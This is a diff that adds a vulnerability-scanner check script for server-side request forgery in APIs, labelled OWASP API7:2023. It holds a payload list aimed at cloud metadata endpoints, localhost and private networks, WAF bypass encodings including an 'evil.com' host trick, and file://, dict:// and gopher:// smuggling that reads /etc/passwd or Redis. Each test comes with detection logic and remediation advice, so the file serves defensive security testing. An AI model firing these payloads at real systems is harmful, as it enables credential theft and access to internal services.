@@ -1,0 +1,246 @@
+metadata:
+    language: v2-beta
+    name: "API7:2023 - Server Side Request Forgery (SSRF)"
+    description: "Detects SSRF vulnerabilities in APIs with advanced payloads, WAF bypass techniques, and cloud metadata access"
+    author: "OWASP API Security"
+    tags: "owasp-api-top10", "ssrf", "api7"
+
+define:
+    # Cloud metadata endpoints
+    aws_metadata = "http://169.254.169.254/latest/meta-data/"
+    aws_metadata_v2 = "http://169.254.169.254/latest/api/token"
+    gcp_metadata = "http://metadata.google.internal/computeMetadata/v1/"
+    azure_metadata = "http://169.254.169.254/metadata/instance?api-version=2021-02-01"
+    digitalocean_metadata = "http://169.254.169.254/metadata/v1/"
+    # Internal network targets
+    localhost_http = "http://127.0.0.1/"
+    localhost_alt = "http://0.0.0.0/"
+    localhost_ipv6 = "http://[::1]/"
+    localhost_short = "http://0/"
+    internal_192 = "http://192.168.1.1/"
+    internal_10 = "http://10.0.0.1/"
+    internal_172 = "http://172.16.0.1/"
+    # WAF bypass - IP encoding
+    ssrf_decimal = "http://2130706433/"
+    ssrf_hex = "http://0x7f000001/"
+    ssrf_octal = "http://0177.0.0.1/"
+    ssrf_overflow = "http://127.0.0.1:80@evil.com/"
+    # WAF bypass - URL encoding
+    ssrf_url_encoded = "http://%31%32%37%2e%30%2e%30%2e%31/"
+    ssrf_double_encoded = "http://%25%33%31%25%33%32%25%33%37%2e%30%2e%30%2e%31/"
+    # WAF bypass - DNS rebinding / alternatives
+    ssrf_localhost_dns = "http://localtest.me/"
+    ssrf_nip_io = "http://127.0.0.1.nip.io/"
+    ssrf_spoofed_host = "http://spoofed.burpcollaborator.net/"
+    # Protocol smuggling
+    ssrf_file = "file:///etc/passwd"
+    ssrf_dict = "dict://127.0.0.1:6379/INFO"
+    ssrf_gopher = "gopher://127.0.0.1:6379/_INFO"
+    # Redirect-based SSRF
+    ssrf_redirect = "https://httpbin.org/redirect-to?url=http://169.254.169.254/latest/meta-data/"
+
+given request then
+    if not({base.request.url} matches "(api|v[0-9]|rest|graphql|service)")  then
+        log(message: "Skipping non-API endpoint")
+    end if
+
+    # Only test endpoints that accept URL-like parameters
+    if {base.request.url} matches "(url|uri|link|src|source|dest|destination|redirect|return|next|target|path|file|page|feed|host|domain|callback|rurl|imgurl|image_url|webhook|endpoint|proxy|fetch|load|open|include|navigate|site)" then
+
+        # Test 1: AWS Metadata Access
+        send request called ssrf_aws:
+            method: {base.request.method}
+            replacing: regex("(url|uri|link|src|source|dest|destination|target|path|file|callback|imgurl|image_url|webhook|endpoint|proxy|fetch|load)=[^&]+", `$1={aws_metadata}`)
+            headers: {base.request.headers}
+
+        if {ssrf_aws.response.status_code} is "200" then
+            if {ssrf_aws.response.body} matches "(ami-id|instance-id|instance-type|hostname|local-ipv4|iam|security-credentials)" then
+                report issue:
+                    severity: high
+                    confidence: firm
+                    detail: "SSRF - AWS Metadata Access: The API fetched the AWS EC2 metadata endpoint (169.254.169.254). Attackers can extract IAM credentials, instance identity, and network configuration."
+                    remediation: "Validate and whitelist URLs server-side. Block requests to link-local addresses (169.254.0.0/16). Use IMDSv2 with required token. Implement network-level controls."
+            end if
+        end if
+
+        # Test 2: GCP Metadata Access
+        send request called ssrf_gcp:
+            method: {base.request.method}
+            replacing: regex("(url|uri|link|src|source|dest|destination|target|path|callback|webhook|endpoint|proxy|fetch)=[^&]+", `$1={gcp_metadata}`)
+            headers: {base.request.headers}
+            appending header: "Metadata-Flavor" => "Google"
+
+        if {ssrf_gcp.response.status_code} is "200" then
+            if {ssrf_gcp.response.body} matches "(project|instance|zone|service-accounts)" then
+                report issue:
+                    severity: high
+                    confidence: firm
+                    detail: "SSRF - GCP Metadata Access: The API fetched GCP metadata, potentially exposing service account tokens and project configuration."
+                    remediation: "Block metadata endpoint access. Use GCP's metadata concealment. Validate URLs against an allowlist."
+            end if
+        end if
+
+        # Test 3: Localhost / Internal Network Access
+        send request called ssrf_localhost:
+            method: {base.request.method}
+            replacing: regex("(url|uri|link|src|source|dest|target|callback|webhook|endpoint|proxy|fetch)=[^&]+", `$1={localhost_http}`)
+            headers: {base.request.headers}
+
+        if {ssrf_localhost.response.status_code} is "200" then
+            if {ssrf_localhost.response.body} differs from {base.response.body} then
+                report issue:
+                    severity: high
+                    confidence: firm
+                    detail: "SSRF - Localhost Access: The API successfully fetched content from 127.0.0.1, enabling access to internal services (databases, admin panels, etc.)."
+                    remediation: "Implement URL validation that blocks private/reserved IP ranges. Use allowlists for permitted destinations."
+            end if
+        end if
+
+        # Test 4: WAF Bypass - Decimal IP (2130706433 = 127.0.0.1)
+        send request called ssrf_decimal:
+            method: {base.request.method}
+            replacing: regex("(url|uri|link|src|source|dest|target|callback|webhook|endpoint|proxy|fetch)=[^&]+", `$1={ssrf_decimal}`)
+            headers: {base.request.headers}
+
+        if {ssrf_decimal.response.status_code} is "200" then
+            if {ssrf_decimal.response.body} differs from {base.response.body} then
+                report issue:
+                    severity: high
+                    confidence: firm
+                    detail: "SSRF WAF Bypass - Decimal IP: Using decimal IP notation (2130706433 = 127.0.0.1) bypassed SSRF protections. The WAF fails to detect non-standard IP representations."
+                    remediation: "Resolve and normalize all IP representations (decimal, hex, octal) before validation. Block all private IP ranges in their canonical form."
+            end if
+        end if
+
+        # Test 5: WAF Bypass - Hex IP
+        send request called ssrf_hex:
+            method: {base.request.method}
+            replacing: regex("(url|uri|link|src|source|dest|target|callback|webhook|endpoint|proxy|fetch)=[^&]+", `$1={ssrf_hex}`)
+            headers: {base.request.headers}
+
+        if {ssrf_hex.response.status_code} is "200" then
+            if {ssrf_hex.response.body} differs from {base.response.body} then
+                report issue:
+                    severity: high
+                    confidence: firm
+                    detail: "SSRF WAF Bypass - Hex IP: Using hexadecimal IP (0x7f000001 = 127.0.0.1) bypassed SSRF protections."
+                    remediation: "Parse and resolve IP addresses in all formats before validation. Use a robust URL parser that handles hex notation."
+            end if
+        end if
+
+        # Test 6: WAF Bypass - Octal IP
+        send request called ssrf_octal:
+            method: {base.request.method}
+            replacing: regex("(url|uri|link|src|source|dest|target|callback|webhook|endpoint|proxy|fetch)=[^&]+", `$1={ssrf_octal}`)
+            headers: {base.request.headers}
+
+        if {ssrf_octal.response.status_code} is "200" then
+            if {ssrf_octal.response.body} differs from {base.response.body} then
+                report issue:
+                    severity: high
+                    confidence: firm
+                    detail: "SSRF WAF Bypass - Octal IP: Using octal IP notation (0177.0.0.1 = 127.0.0.1) bypassed SSRF protections."
+                    remediation: "Implement comprehensive IP validation that handles octal notation. Resolve IPs to canonical form before checking."
+            end if
+        end if
+
+        # Test 7: WAF Bypass - URL Encoding
+        send request called ssrf_url_encoded_check:
+            method: {base.request.method}
+            replacing: regex("(url|uri|link|src|source|dest|target|callback|webhook|endpoint|proxy|fetch)=[^&]+", `$1={ssrf_url_encoded}`)
+            headers: {base.request.headers}
+
+        if {ssrf_url_encoded_check.response.status_code} is "200" then
+            if {ssrf_url_encoded_check.response.body} differs from {base.response.body} then
+                report issue:
+                    severity: high
+                    confidence: firm
+                    detail: "SSRF WAF Bypass - URL Encoding: URL-encoded IP (%31%32%37...) bypassed SSRF filters."
+                    remediation: "URL-decode inputs before validation. Apply SSRF checks after full URL normalization."
+            end if
+        end if
+
+        # Test 8: DNS Rebinding via nip.io
+        send request called ssrf_nip:
+            method: {base.request.method}
+            replacing: regex("(url|uri|link|src|source|dest|target|callback|webhook|endpoint|proxy|fetch)=[^&]+", `$1={ssrf_nip_io}`)
+            headers: {base.request.headers}
+
+        if {ssrf_nip.response.status_code} is "200" then
+            if {ssrf_nip.response.body} differs from {base.response.body} then
+                report issue:
+                    severity: high
+                    confidence: firm
+                    detail: "SSRF via DNS Rebinding: Using 127.0.0.1.nip.io (which resolves to 127.0.0.1) bypassed hostname-based SSRF protections. DNS-based checks can be circumvented."
+                    remediation: "Resolve DNS and validate the resolved IP against blocklists. Perform validation after DNS resolution, not just on the hostname. Pin DNS results."
+            end if
+        end if
+
+        # Test 9: Protocol Smuggling - file://
+        send request called ssrf_file_check:
+            method: {base.request.method}
+            replacing: regex("(url|uri|link|src|source|dest|target|path|file|fetch)=[^&]+", `$1={ssrf_file}`)
+            headers: {base.request.headers}
+
+        if {ssrf_file_check.response.status_code} is "200" then
+            if {ssrf_file_check.response.body} matches "(root:|nobody:|daemon:)" then
+                report issue:
+                    severity: high
+                    confidence: firm
+                    detail: "SSRF - Local File Read via file:// Protocol: The API processed a file:// URL and returned local file contents (/etc/passwd). Full filesystem read access is possible."
+                    remediation: "Whitelist allowed URL schemes (https:// only). Reject file://, gopher://, dict://, and other non-HTTP protocols."
+            end if
+        end if
+
+        # Test 10: IPv6 Localhost
+        send request called ssrf_ipv6:
+            method: {base.request.method}
+            replacing: regex("(url|uri|link|src|source|dest|target|callback|webhook|endpoint|proxy|fetch)=[^&]+", `$1={localhost_ipv6}`)
+            headers: {base.request.headers}
+
+        if {ssrf_ipv6.response.status_code} is "200" then
+            if {ssrf_ipv6.response.body} differs from {base.response.body} then
+                report issue:
+                    severity: high
+                    confidence: firm
+                    detail: "SSRF via IPv6 Localhost: Using [::1] (IPv6 loopback) bypassed IPv4-only SSRF filters."
+                    remediation: "Block both IPv4 and IPv6 loopback and private addresses. Validate resolved addresses regardless of IP version."
+            end if
+        end if
+
+        # Test 11: Redirect-based SSRF
+        send request called ssrf_redirect_check:
+            method: {base.request.method}
+            replacing: regex("(url|uri|link|src|source|dest|target|callback|webhook|endpoint|proxy|fetch)=[^&]+", `$1={ssrf_redirect}`)
+            headers: {base.request.headers}
+
+        if {ssrf_redirect_check.response.status_code} is "200" then
+            if {ssrf_redirect_check.response.body} matches "(ami-id|instance-id|meta-data)" then
+                report issue:
+                    severity: high
+                    confidence: firm
+                    detail: "SSRF via Open Redirect: The API follows redirects to internal targets. An external URL redirected to the AWS metadata endpoint and the API followed it."
+                    remediation: "Disable automatic redirect following for server-side requests. If redirects are needed, validate each redirect destination. Apply the same SSRF protections to redirect targets."
+            end if
+        end if
+    end if
+
+    # Test 12: SSRF in POST body (JSON)
+    if {base.request.method} matches "(POST|PUT|PATCH)" then
+        if {base.request.body} matches "(url|uri|link|src|source|href|endpoint|callback|webhook|image|avatar|icon|logo|feed)" then
+            send request called ssrf_body_check:
+                method: {base.request.method}
+                headers: {base.request.headers}
+                replacing: regex("(\"(?:url|uri|link|src|source|href|endpoint|callback|webhook|image|avatar|icon|logo|feed)\"\\s*:\\s*\")[^\"]+\"", `$1http://169.254.169.254/latest/meta-data/"`)
+
+            if {ssrf_body_check.response.status_code} is "200" then
+                if {ssrf_body_check.response.body} matches "(ami-id|instance-id|meta-data|security-credentials)" then
+                    report issue:
+                        severity: high
+                        confidence: firm
+                        detail: "SSRF via JSON Body: URL parameter in the JSON request body was used to access AWS metadata. Server-side request forgery through POST body parameters."
+                        remediation: "Validate all URL inputs in request bodies. Apply the same SSRF protections to URLs in JSON payloads as query parameters."
+                end if
+            end if
+        end if
+    end if
